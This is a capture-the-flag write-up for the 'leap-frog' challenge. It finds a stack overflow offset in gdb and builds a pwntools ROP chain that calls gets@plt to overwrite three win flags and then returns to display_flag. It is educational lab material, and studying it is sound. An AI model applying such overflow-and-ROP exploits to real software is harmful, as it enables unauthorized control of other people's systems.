## What do we know so far

Take a look at the source code.

* The flag is printed by ``display_flag`` function conditionally. We need to make ``win1 && win2 && win3`` true.
```
  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
```
* The ``vuln`` is to take user input, good place to get started.
* ``leapA`` to control ``win1``, simply set it ``true``.
* ``leap2`` takes an argument ``arg_check``, clearly it needs to be ``0xDEADBEEF``, and ``win3`` to be ``true``.
* ``leap3`` to set ``win3`` to be ``true`` when ``win1 && !win1`` is ``true``, impossible.


## Padding

First of all, find out the correct padding for buffer overflow.
```
(gdb) r <<< $(python2 -c 'import pwn;print(pwn.cyclic(128))')
Starting program: /problems/leap-frog_2_b375af7c48bb686629be6dd928a46897/rop <<< $(python2 -c 'import pwn;print(pwn.cyclic(128))')
Enter your input> 
Program received signal SIGSEGV, Segmentation fault.
0x61616168 in ?? ()
(gdb) info stack
#0  0x61616168 in ?? ()
#1  0x61616169 in ?? ()
#2  0x6161616a in ?? ()
#3  0x6161616b in ?? ()
#4  0x6161616c in ?? ()
#5  0x6161616d in ?? ()
#6  0x6161616e in ?? ()
#7  0x6161616f in ?? ()
#8  0x61616170 in ?? ()
#9  0x61616171 in ?? ()
#10 0x61616172 in ?? ()
...
```
Now we can get the offset with ``cyclic_find``
```
    ofs = pwn.cyclic_find(pwn.p32(0x61616168)) # 28
```

## win1 && win2 && win3

The three leap functions to control each of them, but apparently we can't run through ``leap3`` to get it. Due to [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) we can't skip the impossible check by jumping. Can we set the them to ``true`` directly? ``gets``@plt can read from ``stdin`` and write to any writable segment memory, the ``winX`` located contiguously, so we can send ``\x01\x01\x01`` to set them all true.

```
    payload = b''
    elf = pwn.ELF(remote_binary, False)
    payload += pwn.p32(elf.sym['gets']) # gets@plt
    payload += pwn.p32(elf.sym['display_flag'])
    payload += pwn.p32(elf.sym['win1'])
    ...
    conn.writelineafter("Enter your input> ", payload)
    conn.writeline(b"\x01\x01\x01") # set win1, win2 and win3 to true
    ...
```

Read all the response to get the flag.
